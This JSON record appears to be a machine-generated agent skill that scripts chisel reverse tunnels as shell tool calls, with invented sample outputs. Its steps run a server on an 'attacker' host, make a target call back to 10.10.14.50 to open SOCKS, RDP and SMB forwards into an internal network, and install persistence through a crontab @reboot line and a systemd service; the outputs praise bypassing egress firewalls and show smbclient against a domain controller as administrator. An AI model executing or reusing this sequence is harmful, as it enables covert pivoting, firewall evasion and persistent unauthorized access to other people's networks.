{
  "name": "chisel_reverse_tunneling",
  "description": "Chisel for fast TCP/UDP tunnels over HTTP with reverse port forwarding",
  "pattern": "chisel|reverse.*tunnel|http.*tunnel",
  "parameters": ["server_host", "server_port", "forward_spec"],
  "sequence": [
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "chisel", "args": ["server", "--port", "8080", "--reverse"]},
      "expected_output": {"type": "string", "example": "2024/01/15 16:30:00 server: Reverse tunnelling enabled\n2024/01/15 16:30:00 server: Fingerprint Ab:Cd:Ef:12:34:56:78:90:Ab:Cd:Ef:12:34:56:78:90\n2024/01/15 16:30:00 server: Listening on http://0.0.0.0:8080\n\nChisel server started:\n  Mode: Reverse tunneling (--reverse)\n  Port: 8080\n  Protocol: HTTP/WebSocket\n  Listen: All interfaces (0.0.0.0)\n\nWaiting for client connections...\n\nClient command (on target):\n  chisel client attacker:8080 R:1080:socks\n  chisel client attacker:8080 R:3389:192.168.10.20:3389\n\nAdvantages:\n  - Bypasses egress firewalls (outbound HTTP)\n  - No inbound firewall rules needed\n  - Encrypted via WebSocket\n  - Single binary, no dependencies"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "./chisel client 10.10.14.50:8080 R:1080:socks &"]},
      "expected_output": {"type": "string", "example": "2024/01/15 16:31:15 client: Connecting to ws://10.10.14.50:8080\n2024/01/15 16:31:15 client: Connected (Latency 45ms)\n2024/01/15 16:31:15 client: Fingerprint Ab:Cd:Ef:12:34:56:78:90:Ab:Cd:Ef:12:34:56:78:90\n\nChisel client connected to 10.10.14.50:8080\n\nReverse SOCKS tunnel:\n  Server side: 127.0.0.1:1080 (SOCKS5 proxy)\n  Client side: Routes all traffic from server proxy\n\nAttacker usage (on server):\n  curl --proxy socks5://127.0.0.1:1080 http://192.168.10.20\n  proxychains nmap -sT 192.168.10.0/24\n\nTraffic flow:\n  Attacker tool -> 127.0.0.1:1080 -> Chisel server\n    | HTTP/WebSocket over Internet\n  Chisel client -> Internal network (192.168.10.0/24)\n\nPersistence (on target):\n  crontab -e\n  @reboot /opt/chisel client 10.10.14.50:8080 R:1080:socks"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "./chisel client 10.10.14.50:8080 R:3389:192.168.10.20:3389 R:445:192.168.10.10:445 &"]},
      "expected_output": {"type": "string", "example": "2024/01/15 16:32:30 client: Connecting to ws://10.10.14.50:8080\n2024/01/15 16:32:30 client: Connected (Latency 52ms)\n2024/01/15 16:32:30 client: Reverse tunnel established: 3389 -> 192.168.10.20:3389\n2024/01/15 16:32:30 client: Reverse tunnel established: 445 -> 192.168.10.10:445\n\nMultiple reverse port forwards active:\n\nTunnel 1:\n  Attacker: 127.0.0.1:3389\n  Target: 192.168.10.20:3389 (RDP)\n  Service: Remote Desktop\n\nTunnel 2:\n  Attacker: 127.0.0.1:445\n  Target: 192.168.10.10:445 (SMB)\n  Service: Domain Controller file shares\n\nAttacker usage:\n  rdesktop 127.0.0.1:3389\n  smbclient -L 127.0.0.1 -U administrator\n\nNetwork topology:\n  Attacker (10.10.14.50) <- HTTP tunnel <- Client (10.10.10.100)\n    |                                         |\n  Ports 3389, 445                     Internal network (192.168.10.0/24)\n\nAll traffic encrypted in HTTP/WebSocket"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "./chisel client 10.10.14.50:8080 R:8888:127.0.0.1:8888 &"]},
      "expected_output": {"type": "string", "example": "2024/01/15 16:33:45 client: Connecting to ws://10.10.14.50:8080\n2024/01/15 16:33:45 client: Connected (Latency 48ms)\n2024/01/15 16:33:45 client: Reverse tunnel established: 8888 -> 127.0.0.1:8888\n\nLocal-to-local reverse tunnel:\n  Attacker: 127.0.0.1:8888\n  Client: 127.0.0.1:8888 (localhost)\n\nUse case: Access client's localhost services\n  Web proxy running on client's localhost\n  Local database on client machine\n  SSH on client's loopback\n\nExample:\n  Client runs: mitmproxy -p 8888\n  Attacker accesses: curl --proxy http://127.0.0.1:8888 http://target.com\n  Result: Attacker's traffic proxied through client's local mitmproxy\n\nAdvantage:\n  Access services that only listen on 127.0.0.1 on remote machine"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "chisel", "args": ["server", "--port", "8080", "--reverse", "--auth", "user:P@ssw0rd123"]},
      "expected_output": {"type": "string", "example": "2024/01/15 16:34:50 server: Reverse tunnelling enabled\n2024/01/15 16:34:50 server: Authentication enabled\n2024/01/15 16:34:50 server: Fingerprint Ab:Cd:Ef:12:34:56:78:90:Ab:Cd:Ef:12:34:56:78:90\n2024/01/15 16:34:50 server: Listening on http://0.0.0.0:8080\n\nChisel server with authentication:\n  Username: user\n  Password: P@ssw0rd123\n  Clients must authenticate to connect\n\nClient command:\n  chisel client --auth user:P@ssw0rd123 10.10.14.50:8080 R:1080:socks\n\nSecurity features:\n  - Prevents unauthorized tunnel connections\n  - Basic auth over WebSocket\n  - Combine with TLS for full encryption\n\nTLS mode:\n  chisel server --port 8080 --reverse --key server.key --cert server.crt\n  Client: chisel client --fingerprint <hash> https://attacker:8080 R:1080:socks"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "./chisel client 10.10.14.50:8080 R:0.0.0.0:9999:192.168.10.20:80 &"]},
      "expected_output": {"type": "string", "example": "2024/01/15 16:35:55 client: Connecting to ws://10.10.14.50:8080\n2024/01/15 16:35:55 client: Connected (Latency 50ms)\n2024/01/15 16:35:55 client: Reverse tunnel established: 0.0.0.0:9999 -> 192.168.10.20:80\n\nPublic reverse port forward:\n  Server: 0.0.0.0:9999 (all interfaces)\n  Target: 192.168.10.20:80\n\nAccessible from:\n  - Attacker localhost: http://127.0.0.1:9999\n  - Attacker LAN IP: http://10.10.14.50:9999\n  - Internet (if server is public): http://attacker-ip:9999\n\nUse case:\n  Expose internal web service to team members\n  Share access without VPN\n  Temporary external access to internal resource\n\nSecurity warning:\n  Port 9999 open to world!\n  Use firewall rules or 127.0.0.1 binding for localhost only:\n    chisel client attacker:8080 R:127.0.0.1:9999:192.168.10.20:80"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > /etc/systemd/system/chisel-client.service << 'EOF'\n[Unit]\nDescription=Chisel Reverse Tunnel\nAfter=network.target\n\n[Service]\nType=simple\nUser=nobody\nExecStart=/usr/local/bin/chisel client --keepalive 30s --max-retry-interval 60s 10.10.14.50:8080 R:1080:socks\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload && systemctl enable chisel-client.service && systemctl start chisel-client.service"]},
      "expected_output": {"type": "string", "example": "Created symlink /etc/systemd/system/multi-user.target.wants/chisel-client.service → /etc/systemd/system/chisel-client.service.\n\nChisel systemd service created:\n  Service: chisel-client.service\n  Status: Enabled and started\n  User: nobody (unprivileged)\n\nService features:\n  - Auto-start on boot\n  - Auto-reconnect on failure (RestartSec=10)\n  - Keep-alive packets (--keepalive 30s)\n  - Max retry interval (--max-retry-interval 60s)\n  - Runs as nobody user (security)\n\nManagement:\n  systemctl status chisel-client\n  systemctl stop chisel-client\n  systemctl restart chisel-client\n  journalctl -u chisel-client -f\n\nPersistent tunnel:\n  Survives reboots\n  Auto-recovers from network issues\n  Production-ready persistence\n\nCheck status:\n  systemctl status chisel-client\n  ● chisel-client.service - Chisel Reverse Tunnel\n     Loaded: loaded (/etc/systemd/system/chisel-client.service; enabled)\n     Active: active (running) since Mon 2024-01-15 16:36:00 UTC; 5s ago"}
    }
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
